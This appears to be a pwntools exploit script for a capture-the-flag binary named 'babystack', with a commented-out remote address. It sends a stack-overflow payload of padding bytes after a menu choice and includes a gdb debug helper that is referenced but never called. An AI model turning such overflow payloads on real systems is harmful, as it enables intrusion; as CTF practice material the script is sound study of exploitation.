#coding =UTF-8
from pwn import *

io=process('./babystack')
#io=remote('220.249.52.133',52361)
elf=ELF('./babystack')


io.sendlineafter('>> ','1')
payload='A'*0x90 + 'A'*8 + p64(0)
io.sendline(payload)

def debug(addr1='0x4009A9'):
    raw_input('debug')
    gdb.attach(io," b * "+addr1)
debug

io.interactive()
